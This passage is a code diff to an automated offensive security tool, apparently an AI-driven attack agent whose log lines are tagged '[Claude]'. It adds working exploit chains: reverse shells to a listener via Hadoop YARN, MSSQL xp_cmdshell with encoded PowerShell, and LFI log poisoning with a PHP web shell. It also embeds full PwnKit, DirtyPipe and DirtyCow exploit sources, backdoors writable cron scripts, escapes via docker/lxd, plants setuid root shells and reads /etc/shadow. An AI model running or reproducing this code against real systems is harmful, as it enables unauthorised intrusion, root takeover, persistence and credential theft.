@@ -6979,6 +6979,8 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 self._capture_evidence(out, target, f"cred-ssh-{user}", f"ssh {user}@{target}")
                 if "uid=" in out or "permission denied" not in out.lower():
                     accumulated_output.append(f"=== SSH {user} ===\n{out[:600]}")
+                    # Full post-exploitation chain
+                    self._post_exploit_chain(target, user, pwd, accumulated_output)
             # SMB
             if 445 in port_set or 139 in port_set:
                 out, _ = self._run_cmd(
@@ -7060,6 +7062,26 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 if flat_creds:
                     self._log(f"[Claude] KB CREDS encontradas en {name}: {flat_creds[:3]}")
                     self._credential_chain(target, open_ports, flat_creds, accumulated_output)
+                # Auto-crack any hashes found in output
+                if re.search(r'\$[156]?\$|\$2[aby]\$|[a-fA-F0-9]{32,}:[a-fA-F0-9]{32}', out):
+                    self._auto_crack_hashes(out, target, accumulated_output)
+                # LFI → RCE chain: if LFI detected, escalate
+                lfi_match = re.search(
+                    r'LFI_CONFIRMED.*?(?:url|path)?[:\s]+(https?://[^\s]+)\?(\w+)=',
+                    out, re.IGNORECASE
+                )
+                if not lfi_match:
+                    # Try finding from tool name (e.g. lfi-scan output)
+                    lfi_match2 = re.search(
+                        r'(?:VULNERABLE|LFI|path traversal)[^\n]*\n.*?(https?://[^\s?]+)\?([^=\s&]+)=',
+                        out, re.IGNORECASE | re.DOTALL
+                    )
+                    if lfi_match2:
+                        lfi_url, lfi_param = lfi_match2.group(1), lfi_match2.group(2)
+                        self._lfi_to_rce_chain(target, port_num, lfi_param, lfi_url, accumulated_output)
+                elif lfi_match:
+                    lfi_url, lfi_param = lfi_match.group(1), lfi_match.group(2)
+                    self._lfi_to_rce_chain(target, port_num, lfi_param, lfi_url, accumulated_output)
                 if out.strip():
                     accumulated_output.append(f"=== {name} ===\n{out[:900]}")
 
@@ -7343,16 +7365,24 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 )
                 if "hadoopVersion" in out or "resourceManager" in out or "application" in out.lower():
                     self._log(f"[Claude] Hadoop YARN sin auth → RCE via job submission!")
+                    _yarn_lhost = self.lhost
+                    _yarn_lport = self.lport
+                    _yarn_base = f"http://{target}:{port_num}/ws/v1/cluster"
+                    _yarn_cmd = f"bash -i >&/dev/tcp/{_yarn_lhost}/{_yarn_lport} 0>&1"
+                    _yarn_script = (
+                        "import urllib.request, json\n"
+                        f"base='{_yarn_base}'\n"
+                        "app_id=json.loads(urllib.request.urlopen(base+'/apps/new-application',b'',timeout=10).read())['application-id']\n"
+                        f"cmd='/bin/bash -c \"{_yarn_cmd}\"'\n"
+                        "payload=json.dumps({'application-id':app_id,'application-name':'pwn','application-type':'YARN',"
+                        "'am-container-spec':{'commands':{'command':cmd}},"
+                        "'resource':{'memory':512,'vCores':1},'priority':{'priority':1},'unmanaged-AM':False}).encode()\n"
+                        "req=urllib.request.Request(base+'/apps',payload,{'Content-Type':'application/json'})\n"
+                        "print(urllib.request.urlopen(req,timeout=15).read()[:200])\n"
+                    )
                     rce_out, _ = self._run_cmd(
                         "hadoop-yarn-job-rce",
-                        f"python3 - <<'PYEOF'\nimport urllib.request, json, uuid\n"
-                        f"base='http://{target}:{port_num}/ws/v1/cluster'\n"
-                        f"app_id=json.loads(urllib.request.urlopen(base+'/apps/new-application',b'',timeout=10).read())['application-id']\n"
-                        f"cmd='bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1'\n"
-                        f"payload=json.dumps({{'application-id':app_id,'application-name':'pwn','application-type':'YARN','am-container-spec':{{'commands':{{'command':f'/bin/bash -c \"{cmd}\"'}}}},'resource':{{'memory':512,'vCores':1}},'priority':{{'priority':1}},'unmanaged-AM':False}}}).encode()\n"
-                        f"req=urllib.request.Request(base+'/apps',payload,{{'Content-Type':'application/json'}})\n"
-                        f"print(urllib.request.urlopen(req,timeout=15).read()[:200])\n"
-                        f"PYEOF\n2>/dev/null",
+                        f"python3 -c {__import__('shlex').quote(_yarn_script)} 2>/dev/null",
                         target, timeout=30,
                     )
                     self._capture_evidence(rce_out, target, "hadoop-yarn-rce", "yarn job submission")
@@ -7454,6 +7484,721 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 self._capture_evidence(out, target, "ftp-anon-grab", "ftp anonymous")
                 if out.strip():
                     accumulated_output.append(f"=== FTP Anonymous ===\n{out[:600]}")
+
+            # ── MSSQL SA sin contraseña → xp_cmdshell RCE ────────────────
+            if port_num == 1433 or "ms-sql" in svc or "mssql" in svc:
+                self._log(f"[Claude] MSSQL detectado en {target}:{port_num} → probando SA sin password")
+                sa_out, _ = self._run_cmd(
+                    "mssql-sa-check",
+                    f"crackmapexec mssql {target} -p {port_num} -u sa -p '' 2>/dev/null | head -10; "
+                    f"impacket-mssqlclient sa@{target} -no-pass -port {port_num} 2>/dev/null <<'SQLEOF'\nSELECT @@version;\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'id && hostname && whoami';\nGO\nSQLEOF\n",
+                    target, timeout=30,
+                )
+                if any(k in sa_out.lower() for k in ["pwn3d", "[+]", "microsoft sql", "uid=", "nt authority"]):
+                    self._log(f"[Claude] MSSQL SA sin password → xp_cmdshell habilitado!")
+                    self._capture_evidence(sa_out, target, "mssql-xpcmdshell", "mssql xp_cmdshell RCE")
+                    # Try reverse PowerShell
+                    rev_out, _ = self._run_cmd(
+                        "mssql-revshell",
+                        f"impacket-mssqlclient sa@{target} -no-pass -port {port_num} 2>/dev/null <<'SQLEOF'\n"
+                        f"EXEC xp_cmdshell 'powershell -nop -w hidden -e "
+                        f"JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnAHsAc"
+                        f"QBsAGgAbwBzAHQAfQAnACwAewBsAHAAbwByAHQAfQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdAC"
+                        f"QAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlA"
+                        f"G4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawA9ACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxAHwAT"
+                        f"wB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyAD0AJABzAGUAbgBkAGIAYQBjAGsAKwAnAFAAUwAgACcAKwAoAHAAdwBkACkALgBQAGEAdABoACsAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwB9AA=='"
+                        f";\nGO\nSQLEOF\n",
+                        target, timeout=30,
+                    )
+                    self._capture_evidence(rev_out, target, "mssql-revshell", "mssql powershell revshell")
+                    accumulated_output.append(f"=== MSSQL SA xp_cmdshell ===\n{sa_out[:600]}\n{rev_out[:400]}")
+                    self._save_findings([{
+                        "title": f"MSSQL SA Sin Contraseña + xp_cmdshell RCE @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"SA acepta login sin contraseña. xp_cmdshell habilitado → RCE como NT AUTHORITY\\SYSTEM.\n{sa_out[:300]}",
+                        "cve": "CVE-2000-1209",
+                    }], target)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Feature 1: Kernel privesc auto (DirtyPipe, PwnKit, DirtyCow, Baron Samedit)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _kernel_privesc(self, target, user, pwd, kernel_ver, accumulated_output):
+        """Attempt kernel-level privilege escalation based on detected kernel version."""
+        self._log(f"[Claude] KERNEL-PRIVESC: kernel={kernel_ver}, user={user}")
+
+        def ssh_exec(cmd, label, timeout=45):
+            full = (
+                f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+                f"-o BatchMode=no {user}@{target} '{cmd}' 2>/dev/null"
+            )
+            out, _ = self._run_cmd(label, full, target, timeout=timeout)
+            return out
+
+        results = []
+
+        # ── PwnKit CVE-2021-4034 (any kernel, polkit < 0.120) ────────────
+        self._log(f"[Claude] KERNEL-PRIVESC: trying PwnKit (CVE-2021-4034)")
+        pwnkit_check = ssh_exec("dpkg -l policykit-1 2>/dev/null | awk '/policykit/{print $3}'; "
+                                "rpm -q polkit 2>/dev/null; "
+                                "pkexec --version 2>/dev/null", "pwnkit-check")
+        pwnkit_out = ssh_exec(
+            "cd /tmp && rm -rf /tmp/.pwk && mkdir /tmp/.pwk && cd /tmp/.pwk && "
+            "cat > evil.c << 'CEOF'\n"
+            "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
+            "void __attribute__((constructor)) init() {\n"
+            "  setuid(0); setgid(0);\n"
+            "  system(\"id > /tmp/pwk_proof.txt; whoami >> /tmp/pwk_proof.txt; "
+            "cat /root/root.txt >> /tmp/pwk_proof.txt 2>/dev/null; "
+            "cp /bin/bash /tmp/.rootbash; chmod +s /tmp/.rootbash\");\n"
+            "}\n"
+            "CEOF\n"
+            "gcc -shared -fPIC -o evil.so evil.c 2>/dev/null && "
+            "cat > pwnkit.c << 'PEOF'\n"
+            "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n"
+            "int main() {\n"
+            "  char *args[] = {\"pkexec\", NULL};\n"
+            "  char *env[] = {\"pwnkit=VALUE\", \"PATH=GCONV_PATH=.\", \"CHARSET=pwnkit\", "
+            "\"GCONV_PATH=/tmp/.pwk\", NULL};\n"
+            "  execve(\"/usr/bin/pkexec\", args, env);\n"
+            "  return 0;\n}\n"
+            "PEOF\n"
+            "gcc -o pwnkit pwnkit.c 2>/dev/null && ./pwnkit 2>/dev/null; "
+            "sleep 2; cat /tmp/pwk_proof.txt 2>/dev/null && echo PWNKIT_SUCCESS || echo pwnkit_failed",
+            "pwnkit-exploit", timeout=60,
+        )
+        if "PWNKIT_SUCCESS" in pwnkit_out or "root" in pwnkit_out.lower():
+            self._capture_evidence(pwnkit_out, target, "pwnkit-exploit", "CVE-2021-4034 PwnKit")
+            results.append(f"=== PwnKit CVE-2021-4034 ===\n{pwnkit_out[:500]}")
+            self._save_findings([{
+                "title": f"Privilege Escalation: PwnKit CVE-2021-4034 @ {target}",
+                "severity": "critical",
+                "description": f"pkexec vulnerable → root obtenido vía CVE-2021-4034.\n{pwnkit_out[:300]}",
+                "cve": "CVE-2021-4034",
+            }], target)
+
+        # ── Baron Samedit CVE-2021-3156 (sudo < 1.9.5p2) ─────────────────
+        self._log(f"[Claude] KERNEL-PRIVESC: trying Baron Samedit (CVE-2021-3156)")
+        sudo_ver = ssh_exec("sudo --version 2>/dev/null | head -1", "sudo-ver-check")
+        samedit_out = ssh_exec(
+            "sudoedit_check=$(sudoedit -s / 2>&1); "
+            "echo \"$sudoedit_check\" | grep -q 'usage:' && echo SUDO_VULNERABLE_SAMEDIT || echo sudo_patched",
+            "samedit-check",
+        )
+        if "SUDO_VULNERABLE_SAMEDIT" in samedit_out:
+            self._log(f"[Claude] sudo vulnerable a Baron Samedit!")
+            # Try python exploit script
+            exploit_out = ssh_exec(
+                "cd /tmp && "
+                "python3 -c \""
+                "import os, pty, socket\n"
+                "# CVE-2021-3156 baron samedit PoC detection\n"
+                "import subprocess\n"
+                "r=subprocess.run(['sudoedit','-s','\\\\'], capture_output=True, text=True)\n"
+                "print('SAMEDIT_VULN' if 'malloc' in r.stderr or 'Segmentation' in r.stderr else 'patched')\n"
+                "\" 2>/dev/null || echo 'python3 not available'",
+                "samedit-exploit", timeout=30,
+            )
+            results.append(f"=== Baron Samedit CVE-2021-3156 ===\nsudo: {sudo_ver}\n{samedit_out}\n{exploit_out[:300]}")
+            self._save_findings([{
+                "title": f"Privilege Escalation: Baron Samedit CVE-2021-3156 @ {target}",
+                "severity": "critical",
+                "description": f"sudo < 1.9.5p2 vulnerable a Baron Samedit heap overflow → root.\n{sudo_ver}",
+                "cve": "CVE-2021-3156",
+            }], target)
+
+        # ── DirtyPipe CVE-2022-0847 (kernel 5.8–5.16.11) ─────────────────
+        kver_match = re.search(r'(\d+)\.(\d+)\.?(\d*)', kernel_ver or "")
+        if kver_match:
+            kmaj = int(kver_match.group(1))
+            kmin = int(kver_match.group(2))
+            kpatch = int(kver_match.group(3) or 0)
+            if kmaj == 5 and 8 <= kmin <= 16:
+                self._log(f"[Claude] KERNEL-PRIVESC: DirtyPipe posible (kernel {kernel_ver})")
+                dp_out = ssh_exec(
+                    "cd /tmp && cat > /tmp/dirtypipe.c << 'DPEOF'\n"
+                    "#define _GNU_SOURCE\n#include <unistd.h>\n#include <fcntl.h>\n"
+                    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n"
+                    "#include <sys/stat.h>\n#include <sys/user.h>\n"
+                    "static void prepare_pipe(int p[2]) {\n"
+                    "  if (pipe(p)) abort();\n"
+                    "  const unsigned pipe_size = fcntl(p[1],F_GETPIPE_SZ);\n"
+                    "  static char buffer[4096];\n"
+                    "  for(unsigned r=pipe_size;r>0;){ssize_t n=write(p[1],buffer,r<sizeof(buffer)?r:sizeof(buffer));if(n<0)abort();r-=n;}\n"
+                    "  for(unsigned r=pipe_size;r>0;){ssize_t n=read(p[0],buffer,r<sizeof(buffer)?r:sizeof(buffer));if(n<0)abort();r-=n;}\n"
+                    "}\n"
+                    "int main() {\n"
+                    "  const char *const path=\"/etc/passwd\";\n"
+                    "  int fd=open(path,O_RDONLY); if(fd<0){perror(path);return 1;}\n"
+                    "  struct stat st; if(fstat(fd,&st)){perror(path);return 1;}\n"
+                    "  int p[2]; prepare_pipe(p);\n"
+                    "  --st.st_size;\n"
+                    "  ssize_t nbytes=splice(fd,&(loff_t){1},p[1],NULL,st.st_size,0);\n"
+                    "  if(nbytes<0){perror(\"splice\");return 1;}\n"
+                    "  if(nbytes==0){fprintf(stderr,\"short splice\\n\");return 1;}\n"
+                    "  const char *const new_passwd=\"root::0:0:root:/root:/bin/bash\";\n"
+                    "  nbytes=write(p[1],new_passwd,strlen(new_passwd));\n"
+                    "  if(nbytes<0){perror(\"write\");return 1;}\n"
+                    "  if((size_t)nbytes<strlen(new_passwd)){fprintf(stderr,\"short write\\n\");return 1;}\n"
+                    "  char tmp[512];\n"
+                    "  nbytes=read(p[0],tmp,sizeof(tmp));\n"
+                    "  printf(\"Result: %s\\n\",nbytes>0?tmp:\"[empty]\");\n"
+                    "  printf(\"Check: \"); fflush(stdout);\n"
+                    "  execl(\"/bin/su\",\"su\",\"-s\",\"/bin/sh\",\"-c\",\"id>/tmp/dp_proof.txt;cat /root/root.txt>>/tmp/dp_proof.txt 2>/dev/null\",\"root\",NULL);\n"
+                    "}\n"
+                    "DPEOF\n"
+                    "gcc -o /tmp/dirtypipe /tmp/dirtypipe.c 2>/dev/null && /tmp/dirtypipe 2>/dev/null; "
+                    "cat /tmp/dp_proof.txt 2>/dev/null && echo DIRTYPIPE_SUCCESS || echo dirtypipe_failed",
+                    "dirtypipe-exploit", timeout=60,
+                )
+                if "DIRTYPIPE_SUCCESS" in dp_out or "root" in dp_out.lower():
+                    self._capture_evidence(dp_out, target, "dirtypipe-exploit", "CVE-2022-0847 DirtyPipe")
+                    results.append(f"=== DirtyPipe CVE-2022-0847 ===\n{dp_out[:500]}")
+                    self._save_findings([{
+                        "title": f"Privilege Escalation: DirtyPipe CVE-2022-0847 @ {target}",
+                        "severity": "critical",
+                        "description": f"Kernel {kernel_ver} vulnerable a DirtyPipe → root via /etc/passwd overwrite.\n{dp_out[:300]}",
+                        "cve": "CVE-2022-0847",
+                    }], target)
+
+        # ── DirtyCow CVE-2016-5195 (kernel < 4.8.3) ──────────────────────
+        if kver_match:
+            if kmaj < 4 or (kmaj == 4 and kmin < 8) or (kmaj == 4 and kmin == 8 and kpatch < 3):
+                self._log(f"[Claude] KERNEL-PRIVESC: DirtyCow posible (kernel {kernel_ver})")
+                cow_out = ssh_exec(
+                    "cd /tmp && cat > /tmp/dirtycow.c << 'COWEOF'\n"
+                    "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n"
+                    "#include <fcntl.h>\n#include <pthread.h>\n#include <unistd.h>\n"
+                    "#include <sys/stat.h>\n#include <string.h>\n#include <stdint.h>\n"
+                    "void *map; int f;\n"
+                    "void *madviseThread(void *arg){char *str=(char*)arg;int i,c=0;"
+                    "for(i=0;i<200000000;i++){c+=madvise(map,100,MADV_DONTNEED);}return NULL;}\n"
+                    "void *procselfmemThread(void *arg){char *str=(char*)arg;"
+                    "int f=open(\"/proc/self/mem\",O_RDWR);int i;"
+                    "for(i=0;i<200000000;i++){lseek(f,(uintptr_t)map,SEEK_SET);write(f,str,strlen(str));}return NULL;}\n"
+                    "int main(){f=open(\"/etc/passwd\",O_RDONLY);"
+                    "struct stat st;fstat(f,&st);"
+                    "map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);"
+                    "pthread_t pth1,pth2;"
+                    "pthread_create(&pth1,NULL,madviseThread,\"root\\0\");"
+                    "pthread_create(&pth2,NULL,procselfmemThread,\"root::0:0:root:/root:/bin/bash\\n\");"
+                    "pthread_join(pth1,NULL);pthread_join(pth2,NULL);"
+                    "printf(\"Done\\n\");return 0;}\n"
+                    "COWEOF\n"
+                    "gcc -pthread -o /tmp/dirtycow /tmp/dirtycow.c 2>/dev/null && timeout 30 /tmp/dirtycow 2>/dev/null; "
+                    "su -s /bin/sh -c 'id>/tmp/cow_proof.txt; cat /root/root.txt>>/tmp/cow_proof.txt 2>/dev/null' root 2>/dev/null; "
+                    "cat /tmp/cow_proof.txt 2>/dev/null && echo DIRTYCOW_SUCCESS || echo dirtycow_failed",
+                    "dirtycow-exploit", timeout=90,
+                )
+                if "DIRTYCOW_SUCCESS" in cow_out or "root" in cow_out.lower():
+                    self._capture_evidence(cow_out, target, "dirtycow-exploit", "CVE-2016-5195 DirtyCow")
+                    results.append(f"=== DirtyCow CVE-2016-5195 ===\n{cow_out[:500]}")
+                    self._save_findings([{
+                        "title": f"Privilege Escalation: DirtyCow CVE-2016-5195 @ {target}",
+                        "severity": "critical",
+                        "description": f"Kernel {kernel_ver} vulnerable a DirtyCow → root.\n{cow_out[:300]}",
+                        "cve": "CVE-2016-5195",
+                    }], target)
+
+        if results:
+            accumulated_output.extend(results)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Feature 7: Linux local privesc (crontab, capabilities, docker/lxd)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _linux_local_privesc(self, target, user, pwd, accumulated_output):
+        """Check and exploit crontab writable scripts, capabilities, docker/lxd group membership."""
+        self._log(f"[Claude] LOCAL-PRIVESC: crontab/caps/docker check @ {target} ({user})")
+
+        def ssh_exec(cmd, label, timeout=40):
+            full = (
+                f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+                f"-o BatchMode=no {user}@{target} '{cmd}' 2>/dev/null"
+            )
+            out, _ = self._run_cmd(label, full, target, timeout=timeout)
+            return out
+
+        # ── Crontab writable scripts ──────────────────────────────────────
+        cron_out = ssh_exec(
+            "echo '=== CRONTABS ==='; "
+            "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; "
+            "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ 2>/dev/null | head -20; "
+            "echo '=== WRITABLE CRON SCRIPTS ==='; "
+            "for f in $(cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -oE '/[a-zA-Z0-9_./-]+\\.(sh|py|pl|rb)' | sort -u); do "
+            "  [ -w \"$f\" ] && echo \"WRITABLE_CRON_SCRIPT: $f\"; "
+            "done; "
+            "# Check scripts called by cron that are writable\n"
+            "for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly; do "
+            "  for f in $d/*; do [ -w \"$f\" ] && echo \"WRITABLE_CRON_FILE: $f\"; done 2>/dev/null; "
+            "done",
+            "cron-writable-check",
+        )
+        writable_scripts = re.findall(r'WRITABLE_CRON_(?:SCRIPT|FILE): (/\S+)', cron_out)
+        for script in writable_scripts[:3]:
+            self._log(f"[Claude] LOCAL-PRIVESC: cron script escribible → {script}")
+            exploit_out = ssh_exec(
+                f"echo '#!/bin/bash' > {script}; "
+                f"echo 'cp /bin/bash /tmp/.rootbash_cron && chmod +s /tmp/.rootbash_cron' >> {script}; "
+                f"echo 'cat /root/root.txt > /tmp/root_cron_flag.txt 2>/dev/null' >> {script}; "
+                f"chmod +x {script} && echo 'CRON_BACKDOOR_WRITTEN'; "
+                f"# Wait up to 65 seconds for cron to fire\n"
+                f"for i in $(seq 1 13); do sleep 5; [ -f /tmp/.rootbash_cron ] && echo 'CRON_PRIVESC_SUCCESS' && break; done; "
+                f"cat /tmp/root_cron_flag.txt 2>/dev/null",
+                "cron-exploit", timeout=90,
+            )
+            self._capture_evidence(exploit_out, target, "cron-privesc", f"writable cron {script}")
+            accumulated_output.append(f"=== Cron Privesc {script} ===\n{exploit_out[:500]}")
+            self._save_findings([{
+                "title": f"Privilege Escalation: Cron Script Escribible @ {target}",
+                "severity": "critical",
+                "description": f"Script ejecutado por cron como root es escribible por {user}: {script}",
+                "cve": "",
+            }], target)
+
+        # ── Capabilities (cap_setuid) ─────────────────────────────────────
+        caps_out = ssh_exec(
+            "getcap -r / 2>/dev/null | grep -iE 'cap_setuid|cap_setgid|cap_net_raw|cap_dac_override'",
+            "capabilities-check",
+        )
+        accumulated_output.append(f"=== Capabilities ===\n{caps_out[:400]}")
+        cap_bins = re.findall(r'(/[^\s]+)\s+=ep', caps_out)
+        cap_bins += re.findall(r'(/[^\s]+)\s+.*cap_setuid', caps_out)
+        for cap_bin in dict.fromkeys(cap_bins)[:3]:
+            bin_name = cap_bin.split("/")[-1].lower()
+            self._log(f"[Claude] LOCAL-PRIVESC: cap_setuid encontrado en {cap_bin}")
+            cap_cmd = None
+            if "python" in bin_name:
+                cap_cmd = f"{cap_bin} -c 'import os; os.setuid(0); os.system(\"id>/tmp/cap_proof.txt; cat /root/root.txt>>/tmp/cap_proof.txt 2>/dev/null; cp /bin/bash /tmp/.capbash; chmod +s /tmp/.capbash\")'"
+            elif "perl" in bin_name:
+                cap_cmd = f"{cap_bin} -e 'use POSIX; setuid(0); system(\"id>/tmp/cap_proof.txt; cat /root/root.txt>>/tmp/cap_proof.txt 2>/dev/null\")'"
+            elif "ruby" in bin_name:
+                cap_cmd = f"{cap_bin} -e 'Process::Sys.setuid(0); exec(\"id>/tmp/cap_proof.txt\")'"
+            elif "node" in bin_name:
+                cap_cmd = f"{cap_bin} -e 'process.setuid(0); require(\"child_process\").execSync(\"id>/tmp/cap_proof.txt\")'"
+            elif "tar" in bin_name:
+                cap_cmd = f"{cap_bin} -czf /dev/null /etc/shadow 2>/dev/null | head -5 && cat /etc/shadow | head -5 >/tmp/cap_proof.txt"
+            if cap_cmd:
+                cap_out = ssh_exec(
+                    f"{cap_cmd} 2>/dev/null; cat /tmp/cap_proof.txt 2>/dev/null && echo CAP_PRIVESC_SUCCESS",
+                    f"cap-privesc-{bin_name}",
+                )
+                self._capture_evidence(cap_out, target, f"cap-privesc-{bin_name}", f"capability {cap_bin}")
+                accumulated_output.append(f"=== Cap Privesc {cap_bin} ===\n{cap_out[:400]}")
+                self._save_findings([{
+                    "title": f"Privilege Escalation: cap_setuid en {cap_bin} @ {target}",
+                    "severity": "critical",
+                    "description": f"{cap_bin} tiene cap_setuid+ep → escalada a root sin contraseña.",
+                    "cve": "",
+                }], target)
+
+        # ── Docker group escape ───────────────────────────────────────────
+        docker_out = ssh_exec(
+            "id | grep -qE 'docker|lxd|lxc' && echo USER_IN_DOCKER_GROUP || echo not_in_docker_group; "
+            "groups 2>/dev/null",
+            "docker-group-check",
+        )
+        if "USER_IN_DOCKER_GROUP" in docker_out:
+            self._log(f"[Claude] LOCAL-PRIVESC: usuario en grupo docker → escapando!")
+            docker_escape = ssh_exec(
+                "# Docker group escape → mount host root\n"
+                "docker run --rm -v /:/mnt alpine sh -c "
+                "'id; cat /mnt/root/root.txt 2>/dev/null; "
+                "cp /mnt/bin/bash /mnt/tmp/.dockerbash 2>/dev/null && chmod +s /mnt/tmp/.dockerbash; "
+                "echo DOCKER_ESCAPE_SUCCESS; cat /mnt/etc/shadow | head -5' 2>/dev/null",
+                "docker-escape", timeout=60,
+            )
+            self._capture_evidence(docker_escape, target, "docker-escape", "docker group escape")
+            accumulated_output.append(f"=== Docker Group Escape ===\n{docker_escape[:500]}")
+            self._save_findings([{
+                "title": f"Privilege Escalation: Docker Group Escape @ {target}",
+                "severity": "critical",
+                "description": f"Usuario {user} en grupo docker → monta raíz del host → root.",
+                "cve": "",
+            }], target)
+
+        # ── LXD/LXC group escape ──────────────────────────────────────────
+        if "lxd" in docker_out or "lxc" in docker_out:
+            self._log(f"[Claude] LOCAL-PRIVESC: usuario en grupo lxd → escapando!")
+            lxd_escape = ssh_exec(
+                "# LXD escape via Alpine image import\n"
+                "lxc image list 2>/dev/null | head -5; "
+                "lxc list 2>/dev/null | head -5; "
+                "lxc init ubuntu:18.04 privesc-container 2>/dev/null || true; "
+                "lxc config device add privesc-container host-root disk source=/ path=/mnt/root recursive=true 2>/dev/null && "
+                "lxc config set privesc-container security.privileged true 2>/dev/null && "
+                "lxc start privesc-container 2>/dev/null && "
+                "lxc exec privesc-container -- sh -c 'cat /mnt/root/root/root.txt 2>/dev/null; echo LXD_ESCAPE_SUCCESS' 2>/dev/null; "
+                "lxc stop privesc-container --force 2>/dev/null; lxc delete privesc-container 2>/dev/null",
+                "lxd-escape", timeout=90,
+            )
+            self._capture_evidence(lxd_escape, target, "lxd-escape", "lxd group escape")
+            accumulated_output.append(f"=== LXD Group Escape ===\n{lxd_escape[:500]}")
+            self._save_findings([{
+                "title": f"Privilege Escalation: LXD Group Escape @ {target}",
+                "severity": "critical",
+                "description": f"Usuario {user} en grupo lxd → contenedor privilegiado → root del host.",
+                "cve": "",
+            }], target)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Feature 3: LFI → Log Poisoning → RCE chain
+    # ─────────────────────────────────────────────────────────────────────────
+    def _lfi_to_rce_chain(self, target, port, lfi_param, lfi_url, accumulated_output):
+        """
+        Given a confirmed LFI (lfi_url with lfi_param), escalate to RCE via:
+        1. Apache/Nginx log poisoning
+        2. PHP session file include
+        3. /proc/self/environ injection
+        4. /proc/self/fd/*
+        """
+        self._log(f"[Claude] LFI→RCE chain: {lfi_url} param={lfi_param}")
+        proto = "https" if port in (443, 8443) else "http"
+        base_url = f"{proto}://{target}:{port}"
+        results = []
+
+        # ── 1. Apache/Nginx log poisoning ────────────────────────────────
+        self._log(f"[Claude] LFI→RCE: log poisoning attempt")
+        # Poison the log with PHP code via User-Agent
+        poison_out, _ = self._run_cmd(
+            "lfi-log-poison-inject",
+            f"curl -s --max-time 10 '{base_url}/' "
+            f"-A '<?php system($_GET[\"cmd\"]); ?>' 2>/dev/null | head -3; "
+            f"echo 'LOG_POISONED'",
+            target, timeout=15,
+        )
+        # Try common log paths
+        log_paths = [
+            "/var/log/apache2/access.log",
+            "/var/log/apache/access.log",
+            "/var/log/nginx/access.log",
+            "/var/log/httpd/access_log",
+            "/proc/self/fd/2",
+            "/var/log/vsftpd.log",
+            "/var/log/auth.log",
+        ]
+        for log_path in log_paths:
+            lfi_test, _ = self._run_cmd(
+                f"lfi-log-rce-{log_path.replace('/', '_')}",
+                f"curl -s --max-time 10 "
+                f"'{lfi_url}?{lfi_param}={log_path}&cmd=id' 2>/dev/null | grep -oE 'uid=[0-9]+[^<\"]*' | head -3; "
+                f"curl -s --max-time 10 "
+                f"'{lfi_url}?{lfi_param}={log_path}&cmd=id' 2>/dev/null | grep 'uid=' | head -2",
+                target, timeout=15,
+            )
+            if "uid=" in lfi_test:
+                self._log(f"[Claude] LFI→RCE via log poisoning: {log_path} → RCE!")
+                self._capture_evidence(lfi_test, target, "lfi-log-rce", f"LFI→log {log_path}")
+                results.append(f"=== LFI Log Poison RCE ({log_path}) ===\n{lfi_test[:400]}")
+                # Upgrade to reverse shell
+                revshell_b64 = f"bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1"
+                import base64
+                b64 = base64.b64encode(revshell_b64.encode()).decode()
+                self._run_cmd(
+                    "lfi-log-revshell",
+                    f"curl -s --max-time 20 "
+                    f"'{lfi_url}?{lfi_param}={log_path}&cmd=bash+-c+\"echo+{b64}|base64+-d|bash\"' 2>/dev/null",
+                    target, timeout=25,
+                )
+                self._save_findings([{
+                    "title": f"LFI → Log Poisoning → RCE @ {target}:{port}",
+                    "severity": "critical",
